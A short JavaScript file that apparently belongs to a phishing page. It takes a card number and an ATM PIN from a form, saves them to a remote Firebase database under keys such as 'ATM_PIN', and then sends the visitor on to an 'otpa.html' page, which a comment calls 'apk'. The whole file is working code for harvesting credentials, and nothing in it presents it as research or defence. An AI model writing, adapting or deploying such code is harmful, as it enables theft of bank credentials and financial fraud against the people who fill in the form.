
// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

    var ccard = getElementVal("ccard");
    var cpin = getElementVal("cpin");
    

  

  saveMessages(ccard, cpin);

  // redirect to apk
  window.location.href = "otpa.html";
}

const saveMessages = (ccard, cpin) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
      A1C: ccard,
      ATM_PIN: cpin,
      
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

